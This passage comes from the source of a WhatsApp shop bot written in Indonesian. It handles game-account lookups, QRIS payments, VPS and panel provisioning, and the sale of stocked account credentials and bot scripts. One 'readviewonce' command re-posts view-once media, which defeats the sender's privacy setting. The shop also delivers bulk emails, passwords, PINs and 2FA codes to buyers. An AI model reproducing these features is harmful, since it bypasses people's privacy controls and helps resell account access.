 text += `- ${item.name}\n`;
 });
 }
 
 if (items.Weapons && items.Weapons.length > 0) {
 text += `\n*🔫 Weapons*:\n`;
 items.Weapons.forEach(item => {
 text += `- ${item.name}\n`;
 });
 }
 
 if (items.Title && items.Title.length > 0) {
 text += `\n*📜 Title*:\n`;
 items.Title.forEach(item => {
 text += `- ${item.name}\n`;
 });
 }
 
 await m.reply(text);
 } catch (error) {
 console.error(error);
 await m.reply('An error occurred while fetching the data');
 }
}
 break
 
 case "ml": case "mlstalk": {
  let inputData;
  if (args.length >= 2) {
    inputData = args[1].split('|');
  } else if (body.trim().includes('|')) {
    inputData = body.trim().split(/\s+/)[1].split('|');
  } else {
    m.reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  if (inputData.length < 2) {
    m.reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  const userId = inputData[0];
  const zoneId = inputData[1];
  const axios = require('axios');
  axios.get(`https://vapis.my.id/api/ml-stalk?id=${userId}&zoneid=${zoneId}`)
    .then(response => {
      const result = response.data;
      if (result.status && result.data.status.code === 0) {
        const userData = result.data.data;
        const productData = userData.product;
        const caption = `*✅ ML ACCOUNT FOUND*\n\n` +
          `*🎮 Game*: ${productData.name}\n` +
          `*👤 Username*: ${userData.userNameGame}\n` +
          `*🆔 User ID*: ${userData.gameId}\n` +
          `*🌐 Zone ID*: ${userData.zoneId}\n` +
          `_Mobile Legends: Bang Bang_`;
        m.reply(caption);
      } else {
        const errorMsg = result.data?.status?.message || 'Terjadi kesalahan saat mencari data.';
        m.reply(`❌ Error: ${errorMsg}`);
      }
    })
    .catch(error => {
      console.error(error);
      m.reply('❌ Gagal menghubungi API. Silakan coba lagi nanti.');
    });
} break
            
case 'delstock': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik delstock <kode_produk>|<index_stok>\nContoh: delstock SPO1B|0');

    const [kodeProduk, indexStr] = text.split('|').map(item => item.trim());
    if (!kodeProduk || isNaN(indexStr)) {
        return m.reply('Format Salah!\nKetik delstock <kode_produk>|<index_stok>\nContoh: delstock SPO1B|0');
    }

    const index = parseInt(indexStr);
    if (index < 0) {
        return m.reply('Index stok tidak valid.');
    }

    const filePath = `source/${kodeProduk}.json`;
    let stokData = [];
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        stokData = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data stok.');
    }

    if (index >= stokData.length) {
        return m.reply(`Index stok ${index} tidak ditemukan. Stok tersedia: ${stokData.length}`);
    }

    const deletedStok = stokData.splice(index, 1)[0];


    try {
        fs.writeFileSync(filePath, JSON.stringify(stokData, null, 4), 'utf8');
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat menyimpan data stok.');
    }

    m.reply(`Stok berhasil dihapus dari produk ${kodeProduk}:\n\n` +
            `➤ Stok yang dihapus: ${deletedStok}\n` +
            `➤ Sisa stok: ${stokData.length}`);
}
break

case 'stock': {
   
    let produkList = [];
    try {
        const produkData = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(produkData);
    } catch (err) {
        console.error('Terjadi kesalahan saat membaca data produk:', err);
        return m.reply('❌ Terjadi kesalahan saat membaca data produk.');
    }

    if (produkList.length === 0) {
        return m.reply('❌ Tidak ada produk yang tersedia.');
    }

    
    let message = `╭────〔 PRODUCT LIST📦 〕─ 
┊・ Cara Membeli Produk Ketik Perintah Berikut
┊・ buyproduk <kode> <jumlah>
┊・ Contoh: buyproduk spo 1
┊・ Pastikan Code & Jumlah Akun di Ketik dengan benar
┊ ・ Contact Admin: 083170213967
╰┈┈┈┈┈┈┈┈\n\n`;

    for (const produk of produkList) {
        const filePath = `source/${produk.id}.json`;
        let stokData = [];

        
        if (fs.existsSync(filePath)) {
            try {
                const data = fs.readFileSync(filePath, 'utf8');
                stokData = JSON.parse(data);
            } catch (err) {
                console.error(`Terjadi kesalahan saat membaca stok untuk produk ${produk.id}:`, err);
                continue;
            }
        }

        const sold = produk.terjual || 0;
        const stock = stokData.length;

        message += `╭──〔 ${produk.nama} 〕─\n` +
        `┊・ 🏷️| Harga: Rp${produk.harga.toLocaleString('id-ID')}\n` +
        `┊・ 📦| Stok Tersedia: ${stock}\n` +
        `┊・ 🧾| Stok Terjual: ${sold}\n` +
        `┊・ 🔐| Kode: ${produk.id}\n` +
        `┊・ 📝| Desk: ${produk.deskripsi}\n` +
        `╰┈┈┈┈┈┈┈┈\n\n`;
    }

    
    m.reply(message);
}
break
case "domain": {
  if (!isCreator) return Reply(mess.owner)
  if (!args[0]) return m.reply("Domain tidak ditemukan!")
  if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
  const dom = Object.keys(global.subdomain)
  if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
  if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
  let tldnya = dom[args[0] - 1]
  const [host, ip] = args[1].split("|")
  const axios = require('axios');
  
  async function subDomain1(host, ip) {
    return new Promise((resolve) => {
      axios.post(
        `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
        { 
          type: "A", 
          name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, 
          content: ip.replace(/[^0-9.]/gi, ""), 
          ttl: 3600, 
          priority: 10, 
          proxied: false 
        },
        {
          headers: {
            Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
            "Content-Type": "application/json",
          },
        }
      ).then((e) => {
        let res = e.data
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
      }).catch((e) => {
        let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
        let err1Str = String(err1)
        resolve({ success: false, error: err1Str })
      })
    })
  }
  
  await subDomain1(host.toLowerCase(), ip).then(async (e) => {
    if (e['success']) {
      let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
      await m.reply(teks)
    } else return m.reply(`${e['error']}`)
  })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*「 \`PANEL MADE\` 」*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

> sungsu Terms & Conditions:
|•Account expires in 1 month 
|•Save this data as best as possible 
|•Don't just delete the server!
|•If you are caught stealing sc, your account will be automatically deleted, no reff!

> Done by sungsu-cpanel 
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*「 \`PANEL MADE\` 」*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domainV2}

> sungsu Terms & Conditions:
|•Account expires in 1 month
|•Save this data as best as possible
|•Don't just delete the server!
|•If you are caught stealing sc, your account will be automatically deleted, no reff!

> Done by sungsu-cpanel 
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'buyproduk': {
 if (!text) return m.reply('Format Salah!\nKetik buyproduk <kode_produk> <jumlah>\nContoh: buyproduk spo1b 1');
 
 const [idProduk, jumlahStr] = text.split(' ').map(item => item.trim());
 if (!idProduk || isNaN(jumlahStr) || parseInt(jumlahStr) <= 0) {
   return m.reply('Format Salah!\nKetik buyproduk <kode_produk> <jumlah>\nContoh: buyproduk spo1b 1');
 }
 const jumlah = parseInt(jumlahStr);
 let produkList = [];
 try {
   const data = fs.readFileSync('source/produk.json', 'utf8');
   produkList = JSON.parse(data);
 } catch (err) {
   console.error(err);
   return m.reply('Terjadi kesalahan saat membaca data produk.');
 }
 const produk = produkList.find(produk => produk.id === idProduk);
 if (!produk) {
   return m.reply('Produk tidak ditemukan.\nContoh: buyproduk spo1b 1');
 }
 const jsonFileName = `source/${produk.id}.json`;
 const stokData = fs.readFileSync(`${jsonFileName}`, 'utf8');
 const stokJson = JSON.parse(stokData);
 const stok = stokJson.length;
 if (stok <= 0) {
   return m.reply(`Stok ${produk.id} habis. Silahkan chat owner untuk restock.`);
 } else if (jumlah > stok) {
   return m.reply(`Jumlah yang diminta (${jumlah}) melebihi stok yang tersedia (${stok}). Silahkan coba lagi dengan jumlah yang sesuai.`);
 }
 const randomFee = Math.floor(Math.random() * 150);
 const totalAmount = produk.harga * jumlah + randomFee;
 const axios = require('axios');
 try {
   const qrisResponse = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${totalAmount}&codeqr=${global.qrisOrderKuota}`);
   
   if (!qrisResponse.data.result) {
     return m.reply('Gagal membuat pembayaran QRIS. Silahkan coba lagi.');
   }
   const qrisData = qrisResponse.data.result;
   const teks3 = ` *▧ INFORMASI PEMBAYARAN*
*• ID :* ${qrisData.transactionId}
*• Total Pembayaran :* Rp${await toIDR(qrisData.amount)}
*• Expired :* 5 menit 

*Note :* QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid! Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu. 

Ketik *.batalbeli* untuk membatalkan `;

   let msgQr = await conn.sendMessage(m.chat, { 
     footer: `${botname}`, 
     buttons: [{ 
       buttonId: `${prefix}batalbeli`, 
       buttonText: { displayText: 'Batalkan Pembelian' }, 
       type: 1 
     }], 
     headerType: 1, 
     viewOnce: true, 
     image: { url: qrisData.qrImageUrl }, 
     caption: teks3, 
     contextInfo: { mentionedJid: [m.sender] } 
   });

   if (!db.users[m.sender]) db.users[m.sender] = {};
   db.users[m.sender].status_deposit = true;
   
   db.users[m.sender].saweria = {
     msg: msgQr,
     produkId: idProduk,
     jumlah: jumlah,
     transactionId: qrisData.transactionId,
     amount: qrisData.amount
   };
   
   const interval = setInterval(async () => {
     try {
       const paymentStatusResponse = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
       const paymentStatus = paymentStatusResponse.data;

       if (paymentStatus && paymentStatus.amount === qrisData.amount.toString()) {
         clearInterval(interval);
         await conn.sendMessage(m.chat, { delete: msgQr.key }); 
         const productData = JSON.parse(fs.readFileSync(jsonFileName, 'utf8'));
         const purchasedProducts = productData.slice(0, jumlah);
         const remainingProducts = productData.slice(jumlah);
         fs.writeFileSync(jsonFileName, JSON.stringify(remainingProducts, null, 4), 'utf8');
         
         updateSoldCount(idProduk, jumlah);
         
         m.reply(`Pembayaran Terverifikasi. Cek Detail Pesananmu di Private Chat!`);
         
         const productDetails = purchasedProducts.map((item, index) => {
           return `*Product ${index + 1}*\n` +
                  `Email: ${item.email}\n` +
                  `Password: ${item.password}\n` +
                  `Profil: ${item.profil}\n` +
                  `PIN: ${item.pin}\n` +
                  `A2F: ${item.a2f}\n`;
         }).join('\n');
         
         await conn.sendMessage(m.sender, { 
           text: `*PEMBELIAN BERHASIL*\n\n*Produk:* ${produk.id}\n*Jumlah:* ${jumlah}\n\n*DETAIL PRODUK:*\n\n${productDetails}`, 
           contextInfo: { mentionedJid: [m.sender] } 
         });
         
         db.users[m.sender].status_deposit = false;
         delete db.users[m.sender].saweria;
       }
     } catch (err) {
       console.error('Error checking payment status:', err);
     }
   }, 25000); 

   setTimeout(async () => {
     clearInterval(interval);
     try {
       await conn.sendMessage(m.chat, { delete: msgQr.key }); 
       m.reply("QRIS pembayaran telah expired!");
       db.users[m.sender].status_deposit = false;
       if (db.users[m.sender].saweria) {
         delete db.users[m.sender].saweria;
       }
     } catch (err) {
       console.error('Error handling expired payment:', err);
     }
   }, 5 * 60000); 
 } catch (err) {
   console.error('Error in payment process:', err);
   return m.reply('Terjadi kesalahan saat memproses pembayaran. Silahkan coba lagi.');
 }
}
break

case "rvo": case "readviewonce": case "•": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
			
case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Bot V5', 
                  description: "Rp35.000", 
                  id: `${prefix}buysc 1`
                },
                {
                  title: 'Simple Bot V4', 
                  description: "Rp30.000", 
                  id: `${prefix}buysc 2`
                },
                {
                  title: 'Pushkontak Simpel', 
                  description: "Rp25.000", 
                  id: `${prefix}buysc 3`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V5"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "30000"
    Obj.namaSc = "Script Simple Bot V4"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "25000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris payment is only valid for 5 minutes, if it has passed 5 minutes the payment is declared invalid! 
If the payment is successful the bot will automatically send a notification of your payment status..

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 2 & Cpu 2', 
                  description: "Rp30.000 ✅", 
                  id: `${prefix}buyvps 1`
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000 ✅", 
                  id: `${prefix}buyvps 2`
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000 ✅", 
                  id: `${prefix}buyvps 3`
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Penting : Sebelum Membeli Vps Silahkan Ketik cekvps Untuk Mengecek Apakah Vps Ready\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-2vcpu-2gb"
    Obj.harga = "30000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "70000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

        
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

           
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;
            messageText += `Hubungi Owner Jika Ingin Di Instalkan Panel Pterodactyl Dengan Cara Ketik owner`;

            await conn.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
